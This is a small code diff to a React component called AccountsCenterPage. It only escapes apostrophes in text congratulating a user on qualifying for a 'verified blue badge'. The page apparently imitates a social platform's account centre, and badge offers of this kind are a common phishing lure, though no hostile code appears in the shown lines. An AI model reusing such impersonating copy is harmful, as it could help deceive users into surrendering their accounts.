@@ -51,7 +51,7 @@ export default function AccountsCenterPage() {
 
             <div className="mt-[32px] space-y-[15px] text-[15px] leading-[22.5px] text-[#171A1D] text-left">
               <p>
-                Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience. We're thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!
+                Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you&apos;ve built with your audience. We&apos;re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!
               </p>
 
               <p className="text-[#65676B]">
